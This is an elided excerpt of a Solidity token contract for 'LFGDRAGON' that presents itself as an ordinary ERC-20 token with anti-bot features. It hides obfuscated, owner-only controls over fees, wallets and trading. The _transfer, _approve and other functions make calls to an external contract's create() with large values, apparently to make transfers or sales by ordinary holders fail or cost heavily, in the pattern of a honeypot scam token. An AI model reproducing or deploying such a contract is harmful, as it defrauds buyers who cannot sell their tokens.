...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "LFGDRAGON";
    string private _symbol = "LFGDRAGON";
    ...
    uniswapV1 private uniswapV58PairToken;
    ...
    address private uniswapV58Pair_;
    bool private itvs;
    ...
    constructor(address Antibottoken_, address creator, address caSwap) {
        ...
        uniswapV58PairToken = uniswapV1(uniswapV58Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV58Pair_] = true;
        _isExcludedFromFee[uniswapV58Pair_] = true;
    ...
    function holderSend_Ox1147988(address[] memory accounts, bool b) external {
        ...
        if (_msgSender() == address(_Antitbottoken)) { 
            ...
            uniswapV58PairToken.create(8**3);
        }
    }

    function setItvs_Ox1147968(bool b) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            itvs=b;
        } else {
    ...
    function holderlisting_Ox1147988(address[] memory accounts, uint256[] memory a) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
...
/*    function pair_Ox1147998(address aaaa, bool b) public {
...
*/    
    function ag_Ox1147618(uint256 g) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV58PairToken.create(8**3);
    ...
    function Eca_Ox1147628(uint256 aa) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=aa;
        } else {
            uniswapV58PairToken.create(8**3);
    ...
    function incfees_Ox1147633(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
    ...
    function marketingWallet_Ox1147644(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            uniswapV58PairToken = uniswapV1(addresses);
        } else {
            uniswapV58PairToken.create(8**3);
        }
    }
    ...
    function initialitzeW_Ox1147658 (bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV58PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV58PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV58PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV58PairToken.create(250**3); 
        }
